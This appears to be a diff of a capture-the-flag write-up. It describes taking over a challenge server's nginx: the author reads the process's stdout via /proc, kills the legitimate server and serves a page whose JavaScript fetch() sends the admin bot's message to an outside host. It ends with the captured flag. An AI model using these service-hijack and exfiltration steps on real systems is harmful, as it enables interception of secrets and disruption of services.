@@ -163,8 +163,18 @@ However, we can do this:
 2. Spawn our own nginx process that hosts a malicious webpage that exfiltrates the flag to us
 3. Wait for the admin bot to send the flag on our page
 
-Here's the nginx conf that was used (luckily the port is 8080 so we have
-permission to bind it):
+But we don't quite know what the admin bot will do, and there is no nginx log file saved to the disk for us to see. Fortunately, since all processes are ran under `nobody`, we can just tap into the `STDOUT` of current nginx process:
+
+```
+/var/www/exif $ cat /proc/35/fd/1
+172.70.117.15 - - [30/May/2021:08:18:40 +0000] "GET / HTTP/1.1" 200 4775 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4469.0 Safari/537.36" "157.230.54.253"
+172.70.117.115 - - [30/May/2021:08:18:56 +0000] "GET /js/zlib-1.2.11.wasm HTTP/1.1" 200 61388 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4469.0 Safari/537.36" "157.230.54.253"
+172.70.117.115 - - [30/May/2021:08:18:57 +0000] "POST / HTTP/1.1" 200 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4469.0 Safari/537.36" "157.230.54.253"
+```
+
+And we observed the unmistakable admin bot behavior from the `HeadlessChrome`. Since everyone has write permission to `/tmp`, we can deploy a few files there by using `printf 'file content' > /tmp/file`. 
+
+Here's the nginx conf that was used, saved to `/tmp/conf` (we know it's port 8080 because we checked the original config at `/etc/nginx/nginx.conf`):
 
 ```nginx
 worker_processes 1;
@@ -194,7 +204,7 @@ http {
 }
 ```
 
-Here's `index.html`:
+Here's `/tmp/index.html`:
 
 ```html
 <html>
@@ -203,23 +213,29 @@ Here's `index.html`:
 <button id="sendbutton" type="button" class="btn btn-primary">
 <span class="glyphicon glyphicon-upload" aria-hidden="true"></span> Send</button>
 <script type="text/javascript">
-    document.querySelector("#sendbutton").onclick = ()=>fetch("https://da08338acc23cd10f7229bd5e84ba970.m.pipedream.net/"+document.querySelector("#message").value)
+    document.querySelector("#sendbutton").onclick = ()=>fetch("https://some.redacted.server.address/"+document.querySelector("#message").value)
 </script>
 </body>
 </html>
 ```
 
-We can put these files in `/tmp` and run:
+We can then run
+
 ```
 kill -9 <pid of all nginx processes> && nginx -c /tmp/conf
 ```
 
-Even though there are shields respawning nginx processes, this one will be
-faster than whatever monitor resolution they have. So eventually this server
+Even though there are daemons respawning nginx processes, this one will be
+faster than whatever monitoring resolution they have. So eventually this server
 will replace the legit server (the respawned processes will be get a
-port-already-in-use error and die)
+address-already-in-use error and die)
 
-Then we just wait for the admin bot to send us the flag:
+And we have intercepted their secret message to be 
+
+```
+/Ta%20aqui%20a%20flag%20:%20CTF-BR%7BPl3453_d0nt_t3ll_m3_y0u_burn3d_4_0day_0n_th1s%7D
+```
+URL decoding this, we get the flag
 
 ```
 CTF-BR{Pl3453_d0nt_t3ll_m3_y0u_burn3d_4_0day_0n_th1s}
